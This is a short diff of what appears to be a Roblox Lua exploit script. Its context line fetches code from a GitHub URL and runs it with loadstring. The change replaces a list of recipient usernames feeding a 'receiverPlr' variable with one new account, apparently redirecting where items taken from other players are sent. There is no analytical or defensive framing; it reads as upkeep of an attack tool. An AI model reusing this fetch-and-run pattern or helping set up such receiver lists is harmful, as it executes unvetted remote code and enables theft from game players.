@@ -595,14 +595,7 @@ loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/scrip
                 end
 
         local usernames = {
-            "DuoReaper",
-            "Fridausyurkid",
-            "Ruth08968",
-            "0gxe08xzjbOjxe7vf9j1",
-            "HypedMenace",
-            "DoctorCrazySir",
-            "OnePunchGOKUS",
-            "MilkLover5621"
+            "Smiley9Gamerz",
         }
 
         local receiverPlr
